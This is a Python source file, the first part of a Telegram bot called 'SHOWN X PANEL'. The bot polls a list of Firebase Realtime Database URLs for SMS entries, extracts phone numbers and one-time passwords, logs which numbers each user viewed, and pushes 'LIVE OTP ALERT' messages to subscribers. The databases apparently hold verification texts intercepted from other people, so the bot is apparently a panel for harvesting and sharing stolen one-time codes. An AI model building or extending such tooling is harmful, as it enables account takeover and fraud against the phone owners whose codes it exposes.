            "INSERT INTO all_users(user_id,username,first_name,join_date,last_seen) VALUES(?,?,?,?,?)",
            (user_id, username, first_name, now, now),
        )
    return True


async def load_allowed_users() -> None:
    async with db() as conn:
        rows = conn.execute("SELECT user_id FROM allowed_users").fetchall()
    allowed_users.update(r["user_id"] for r in rows)


# ══════════════════════════════════════════════════════════════
#  USER HUB — Number usage log
# ══════════════════════════════════════════════════════════════

async def log_number_used(
    user_id: int, phone: str, otp: str | None,
    db_name: str, db_url: str
) -> None:
    """Record every phone number a user triggered/viewed."""
    async with db() as conn:
        conn.execute(
            """INSERT INTO user_hub(user_id,phone,otp,db_name,db_url,timestamp)
               VALUES(?,?,?,?,?,?)""",
            (user_id, phone, otp, db_name, db_url, datetime.utcnow().isoformat()),
        )


async def get_user_hub(user_id: int, page: int = 0, per_page: int = 10) -> tuple[list, int]:
    offset = page * per_page
    async with db() as conn:
        total = conn.execute(
            "SELECT COUNT(*) FROM user_hub WHERE user_id=?", (user_id,)
        ).fetchone()[0]
        rows = conn.execute(
            "SELECT phone,otp,db_name,timestamp FROM user_hub WHERE user_id=? "
            "ORDER BY timestamp DESC LIMIT ? OFFSET ?",
            (user_id, per_page, offset),
        ).fetchall()
    return [dict(r) for r in rows], total


async def get_user_hub_stats(user_id: int) -> dict:
    async with db() as conn:
        total = conn.execute(
            "SELECT COUNT(*) FROM user_hub WHERE user_id=?", (user_id,)
        ).fetchone()[0]
        unique_phones = conn.execute(
            "SELECT COUNT(DISTINCT phone) FROM user_hub WHERE user_id=?", (user_id,)
        ).fetchone()[0]
        last_row = conn.execute(
            "SELECT timestamp FROM user_hub WHERE user_id=? ORDER BY timestamp DESC LIMIT 1",
            (user_id,),
        ).fetchone()
        last_active = last_row[0] if last_row else None
    return {"total": total, "unique_phones": unique_phones, "last_active": last_active}


# ══════════════════════════════════════════════════════════════
#  FIREBASE HEALTH SYSTEM
# ══════════════════════════════════════════════════════════════

async def _ping_firebase(url: str, session: aiohttp.ClientSession) -> bool:
    """Returns True if Firebase URL is alive."""
    try:
        test_url = url.rstrip("/") + "/.json?shallow=true&timeout=5s"
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            return resp.status in (200, 404)  # 404 = empty DB, still alive
    except Exception:
        return False


async def run_firebase_health_check(session: aiohttp.ClientSession) -> dict[str, str]:
    """Ping all DBs concurrently. Returns {name: 'alive'|'dead'}."""
    results: dict[str, str] = {}

    async def _check(name: str, url: str) -> None:
        alive = await _ping_firebase(url, session)
        status = "alive" if alive else "dead"
        results[name] = status
        _fb_health[name] = {
            "status": status,
            "last_check": time.time(),
            "url": url,
        }
        # Persist to DB
        async with db() as conn:
            existing = conn.execute(
                "SELECT fail_count FROM firebase_health WHERE db_name=?", (name,)
            ).fetchone()
            fail_count = (existing["fail_count"] or 0) if existing else 0
            if not alive:
                fail_count += 1
            else:
                fail_count = 0
            conn.execute(
                """INSERT INTO firebase_health(db_name,db_url,status,last_check,fail_count)
                   VALUES(?,?,?,?,?)
                   ON CONFLICT(db_name) DO UPDATE SET
                   db_url=excluded.db_url, status=excluded.status,
                   last_check=excluded.last_check, fail_count=excluded.fail_count""",
                (name, url, status, datetime.utcnow().isoformat(), fail_count),
            )

    tasks = [_check(name, url) for name, url in DATABASES.items()]
    await asyncio.gather(*tasks, return_exceptions=True)
    return results


def get_db_status_icon(name: str) -> str:
    h = _fb_health.get(name, {})
    status = h.get("status", "unknown")
    if status == "alive":
        return "🟢"
    if status == "dead":
        return "🔴"
    return "⚪"


async def remove_dead_databases() -> int:
    """Remove all DBs marked dead from DATABASES. Returns count removed."""
    dead = [name for name, h in _fb_health.items() if h.get("status") == "dead"]
    for name in dead:
        DATABASES.pop(name, None)
    return len(dead)


# ══════════════════════════════════════════════════════════════
#  CLONE MANAGER
# ══════════════════════════════════════════════════════════════

async def clone_database(source_name: str, new_name: str, notes: str = "") -> bool:
    url = DATABASES.get(source_name)
    if not url:
        return False
    DATABASES[new_name] = url
    async with db() as conn:
        conn.execute(
            "INSERT INTO cloned_panels(name,source_name,db_url,created_at,notes) VALUES(?,?,?,?,?)",
            (new_name, source_name, url, datetime.utcnow().isoformat(), notes),
        )
    return True


async def get_cloned_panels() -> list[dict]:
    async with db() as conn:
        rows = conn.execute(
            "SELECT * FROM cloned_panels ORDER BY created_at DESC"
        ).fetchall()
    return [dict(r) for r in rows]


# ══════════════════════════════════════════════════════════════
#  WELCOME CONFIG
# ══════════════════════════════════════════════════════════════

async def get_welcome_config() -> dict:
    async with db() as conn:
        row = conn.execute("SELECT * FROM welcome_config WHERE id=1").fetchone()
    if row:
        return dict(row)
    return {"text": None, "media_file_id": None, "media_type": None}


async def set_welcome_config(
    text: str | None = None,
    media_file_id: str | None = None,
    media_type: str | None = None,
) -> None:
    now = datetime.utcnow().isoformat()
    async with db() as conn:
        conn.execute(
            """UPDATE welcome_config SET text=COALESCE(?,text),
               media_file_id=COALESCE(?,media_file_id),
               media_type=COALESCE(?,media_type),
               updated_at=? WHERE id=1""",
            (text, media_file_id, media_type, now),
        )


async def clear_welcome_media() -> None:
    async with db() as conn:
        conn.execute(
            "UPDATE welcome_config SET media_file_id=NULL,media_type=NULL WHERE id=1"
        )


# ══════════════════════════════════════════════════════════════
#  BACKUP MANAGER
# ══════════════════════════════════════════════════════════════

def _build_snapshot() -> bytes:
    """Build a full JSON snapshot of current bot state."""
    snapshot = {
        "version": BOT_VERSION,
        "timestamp": datetime.utcnow().isoformat(),
        "databases": DATABASES,
        "allowed_users": list(allowed_users),
        "firebase_health": _fb_health,
    }
    return json.dumps(snapshot, ensure_ascii=False, indent=2).encode()


def _build_snapshot_gzip() -> bytes:
    return gzip.compress(_build_snapshot())


async def send_backup(bot, target_chat: int, compressed: bool = True) -> bool:
    try:
        data = _build_snapshot_gzip() if compressed else _build_snapshot()
        ext = "json.gz" if compressed else "json"
        fname = f"shownxpanel_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
        await bot.send_document(
            chat_id=target_chat,
            document=io.BytesIO(data),
            filename=fname,
            caption=(
                f"🗄 <b>SHOWN X PANEL BACKUP</b>\n"
                f"📅 {datetime.now().strftime('%d %b %Y %H:%M:%S')}\n"
                f"💾 Size: {len(data)/1024:.1f} KB\n"
                f"🗜 Compressed: {'Yes' if compressed else 'No'}"
            ),
            parse_mode=ParseMode.HTML,
        )
        # Log to history
        async with db() as conn:
            conn.execute(
                "INSERT INTO backup_history(timestamp,filename,size_bytes,target_chat) VALUES(?,?,?,?)",
                (datetime.utcnow().isoformat(), fname, len(data), target_chat),
            )
        return True
    except Exception as e:
        log.error("Backup send failed: %s", e)
        return False


async def get_backup_history(limit: int = 10) -> list[dict]:
    async with db() as conn:
        rows = conn.execute(
            "SELECT * FROM backup_history ORDER BY timestamp DESC LIMIT ?", (limit,)
        ).fetchall()
    return [dict(r) for r in rows]


# ══════════════════════════════════════════════════════════════
#  LIVE MONITOR
# ══════════════════════════════════════════════════════════════

_monitor_subs: set[int] = set()


async def load_monitor_subs() -> None:
    async with db() as conn:
        rows = conn.execute(
            "SELECT user_id FROM monitor_subscriptions WHERE active=1"
        ).fetchall()
    _monitor_subs.update(r["user_id"] for r in rows)


async def toggle_monitor(user_id: int) -> bool:
    """Toggle live monitor subscription. Returns new state."""
    async with db() as conn:
        row = conn.execute(
            "SELECT active FROM monitor_subscriptions WHERE user_id=?", (user_id,)
        ).fetchone()
        if row:
            new_state = 0 if row["active"] else 1
            conn.execute(
                "UPDATE monitor_subscriptions SET active=? WHERE user_id=?",
                (new_state, user_id),
            )
        else:
            new_state = 1
            conn.execute(
                "INSERT INTO monitor_subscriptions(user_id,active) VALUES(?,1)", (user_id,)
            )
    if new_state:
        _monitor_subs.add(user_id)
    else:
        _monitor_subs.discard(user_id)
    return bool(new_state)


async def broadcast_otp_alert(bot, phone: str, otp: str, db_name: str) -> None:
    """Send live OTP alert to all monitor subscribers."""
    if not _monitor_subs:
        return
    text = (
        f"📡 <b>LIVE OTP ALERT</b>\n\n"
        f"📱 <b>Phone:</b> <code>{html.escape(phone)}</code>\n"
        f"🔑 <b>OTP:</b> <code>{html.escape(otp)}</code>\n"
        f"🗄 <b>DB:</b> {html.escape(db_name)}\n"
        f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
    )
    for uid in list(_monitor_subs):
        try:
            await bot.send_message(uid, text, parse_mode=ParseMode.HTML)
        except (Forbidden, TelegramError):
            _monitor_subs.discard(uid)


# ══════════════════════════════════════════════════════════════
#  ACTIVITY LOG
# ══════════════════════════════════════════════════════════════

async def log_activity(user_id: int, action: str, detail: str = "") -> None:
    async with db() as conn:
        conn.execute(
            "INSERT INTO activity_log(user_id,action,detail,timestamp) VALUES(?,?,?,?)",
            (user_id, action, detail, datetime.utcnow().isoformat()),
        )


# ══════════════════════════════════════════════════════════════
#  FORMAT HELPERS
# ══════════════════════════════════════════════════════════════

def fmt_date(iso: str | None) -> str:
    if not iso:
        return "—"
    try:
        return datetime.fromisoformat(iso).strftime("%d %b %Y, %H:%M")
    except Exception:
        return iso or "—"


def fmt_size(num: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if num < 1024:
            return f"{num:.1f} {unit}" if unit != "B" else f"{int(num)} {unit}"
        num /= 1024
    return f"{num:.1f} TB"


def html_escape(text: str) -> str:
    return html.escape(str(text))


def _tlog(msg: str) -> None:
    log.info(msg)


# ══════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession()
    return _http_session


# ══════════════════════════════════════════════════════════════
#  FIREBASE DATA FETCH (from original panel — preserved)
# ══════════════════════════════════════════════════════════════

async def fetch_firebase_sms(url: str, session: aiohttp.ClientSession) -> list[dict]:
    """Fetch SMS/OTP entries from a Firebase Realtime DB."""
    try:
        endpoints = [
            url.rstrip("/") + "/sms/.json",
            url.rstrip("/") + "/SMS/.json",
            url.rstrip("/") + "/messages/.json",
            url.rstrip("/") + "/otp/.json",
        ]
        for endpoint in endpoints:
            try:
                async with session.get(endpoint, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json(content_type=None)
                        if data and isinstance(data, dict):
                            entries = []
                            for key, val in data.items():
                                if isinstance(val, dict):
                                    entries.append({**val, "_key": key})
                                elif isinstance(val, str):
                                    entries.append({"message": val, "_key": key})
                            if entries:
                                return entries
            except Exception:
                continue
    except Exception as e:
        log.debug("Firebase fetch error for %s: %s", url, e)
    return []


def extract_otp_from_entry(entry: dict) -> tuple[str, str]:
    """Extract (phone, otp) from a Firebase entry dict."""
    # Try common field names
    phone = (
        entry.get("phone") or entry.get("mobile") or
        entry.get("number") or entry.get("to") or
        entry.get("Phone") or ""
    )
    message = (
        entry.get("message") or entry.get("body") or
        entry.get("text") or entry.get("sms") or
        entry.get("Message") or ""
    )
    # Extract OTP from message
    otp = ""
    if message:
        # Try to find 4-8 digit OTP
        m = re.search(r"\b(\d{4,8})\b", str(message))
        if m:
            otp = m.group(1)
    return str(phone).strip(), str(otp).strip()


# ══════════════════════════════════════════════════════════════
#  DATA SAVE / LOAD  (migration from old JSON format)
# ══════════════════════════════════════════════════════════════

async def migrate_from_json(json_path: str = "bot_database.json") -> None:
    """One-time migration: load old JSON file into SQLite."""
    if not Path(json_path).exists():
        return
    try:
        with open(json_path, "r") as f:
            data = json.load(f)

        # Migrate allowed users
        for uid in data.get("allowed_users", []):
            try:
                await grant_access(int(uid))
            except Exception:
                pass

        # Migrate databases
        for name, url in data.get("databases", {}).items():
            if name not in DATABASES:
                DATABASES[name] = url

        # Migrate settings
        for key in ("auto_db_enabled", "auto_db_interval", "auto_db_group",
                    "grant_access_required", "referral_enabled", "required_referrals"):
            if key in data:
                await set_setting(key, str(data[key]))

        log.info("Migrated from %s to SQLite", json_path)
        # Rename old file so we don't migrate twice
        Path(json_path).rename(json_path + ".migrated")
    except Exception as e:
        log.warning("JSON migration failed: %s", e)


# ══════════════════════════════════════════════════════════════
#  KEYBOARD BUILDERS
# ══════════════════════════════════════════════════════════════

def main_menu_keyboard(admin: bool = False) -> ReplyKeyboardMarkup:
    rows = [
        [_kb("📡 Panel"), _kb("📊 Status")],
        [_kb("👤 My Hub"), _kb("❓ Help")],
    ]
    if admin:
        rows.append([_kb("👑 Admin Panel")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


def admin_menu_keyboard() -> ReplyKeyboardMarkup:
    rows = [
        [_kb("🗄 DB Manager"),    _kb("🔥 Firebase Health")],
        [_kb("📡 Live Monitor"),  _kb("💾 Backup")],
        [_kb("🧬 Clone Manager"), _kb("🎨 Customize")],
        [_kb("👥 Users"),         _kb("📊 Stats")],
        [_kb("⚙ Settings"),      _kb("⬅ Back")],
    ]
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


def db_panel_keyboard(page: int = 0) -> InlineKeyboardMarkup:
    """Build paginated inline keyboard for DB list."""
    items = list(DATABASES.items())
    per_page = 8
    start = page * per_page
    page_items = items[start:start + per_page]
    total_pages = max(1, (len(items) + per_page - 1) // per_page)

    rows = []
    for name, url in page_items:
        status_icon = get_db_status_icon(name)
        # Sanitize name for callback_data: strip leading/trailing colons, limit length
        safe_name = name[:40].replace(":", "_")
        rows.append([_ikb(
            f"{status_icon} {name}",
            callback_data=f"db:view:{safe_name}",
            style="primary",
        )])

    # Pagination
    nav = []
    if page > 0:
        nav.append(_ikb("⬅", callback_data=f"db:page:{page-1}", style="primary"))
    nav.append(_ikb(f"{page+1}/{total_pages}", callback_data="noop", style="primary"))
    if page < total_pages - 1:
        nav.append(_ikb("➡", callback_data=f"db:page:{page+1}", style="primary"))
    if nav:
        rows.append(nav)

    rows.append([
        _ikb("🔥 Health Check", callback_data="db:health", style="success"),
        _ikb("🗑 Remove Dead",  callback_data="db:remove_dead", style="danger"),
    ])
    rows.append([_ikb("➕ Add DB", callback_data="db:add", style="success")])
    rows.append(back_row("admin:home"))
    return InlineKeyboardMarkup(rows)


# ══════════════════════════════════════════════════════════════
#  WELCOME MESSAGE BUILDER
# ══════════════════════════════════════════════════════════════

async def build_welcome_text(user) -> str:
    quote = random.choice(PANEL_QUOTES)
    wc = await get_welcome_config()
    custom_text = wc.get("text") or ""
    brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
    owner = await get_setting("owner_contact", OWNER_CONTACT)
    mention = user.mention_html() if hasattr(user, "mention_html") else html_escape(str(user))

    base = (
        f"<blockquote>{DIVIDER}\n"
        f"⚡ <b>{html_escape(brand)}</b>\n"
        f"{DIVIDER}</blockquote>\n\n"
        f"👋 <b>Hey</b> {mention}!\n\n"
        f"<blockquote>{DIVIDER_THIN}\n"
        f"💬 <i>{html_escape(quote)}</i>\n"
        f"{DIVIDER_THIN}</blockquote>\n\n"
    )
    if custom_text:
        base += f"<blockquote>{html_escape(custom_text)}</blockquote>\n\n"

    base += (
        f"<blockquote>{DIVIDER}\n"
        f"👑 <b>Owner:</b> {html_escape(owner)}\n"
        f"🤖 <b>Version:</b> {BOT_VERSION}\n"
        f"{DIVIDER}</blockquote>"
    )
    return base


# ══════════════════════════════════════════════════════════════
#  PART 1 ENDS HERE
# ══════════════════════════════════════════════════════════════
# Merge point: Part 2 continues from here.
# All imports, state, helpers, DB layer are defined above.
# Part 2 adds: poll_loop, all handlers, background tasks, main()
